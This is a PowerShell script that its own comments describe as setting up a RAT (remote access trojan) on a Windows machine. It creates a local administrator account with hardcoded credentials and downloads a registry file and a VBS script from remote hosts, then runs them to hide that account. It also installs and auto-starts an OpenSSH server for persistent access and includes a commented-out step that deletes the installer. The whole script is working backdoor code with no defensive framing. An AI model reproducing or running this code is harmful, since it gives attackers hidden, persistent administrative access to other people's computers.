function getRandom() {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

# create local admin for rat
function create_account {
    [CmdLetBinding()]
    param (
        [string] $NewLocalAdmin,
        [securestring] $Password
    )
    begin {
    }
    process {
        New-LocalUser "$NewLocalAdmin" -Password "$Password" -FullName "$NewLocalAdmin" -Description "Temporary Local Admin"
        Write-Verbose "$NewLocalAdmin local user created!"
        Add-LocalGroupMember -Group "Administrators" -Member "$NewLocalAdmin"
        Write-Verbose "$NewLocalAdmin add ke local administrator group!"
    }
    end {
    }
}
# create user admin
$NewLocalAdmin = "cyberword_user"
$Password = (ConvertTo-SecureString "cyberword12345" -AsPlainText -Force)
create_account -NewLocalAdmin $NewLocalAdmin -Password $Password

# registry to hidden local admin
$reg_file = "cyberword_reg"
Invoke-WebRequest -Uri raw.adw -OutFile "$reg_file.reg"

# visual basic script register to registry
$vbs_file = "cyberword_vbs"
Invoke-WebRequest -Uri raw.wa -OutFile "$vbs_file.vbs".ps1 

# install registry
./"$reg_file.reg";"$vbs_file.vbs"

# variabel
$wd = "cyberword_var"
$path = "$env:temp/$wd"
$initial_dir = Get-Location

# enabeling persistance ssh
Add-WindowsCapability -Online -Name OpenSSH.Server~~~0.0.1.0
Start-Service sshd 
Set-Service -Name sshd -StartupType 'Automatic'
Get-NetFirewallRule -Name *ssh*

mkdir $path
cd $initial_dir
# remove installer.ps1
#del installer.ps1
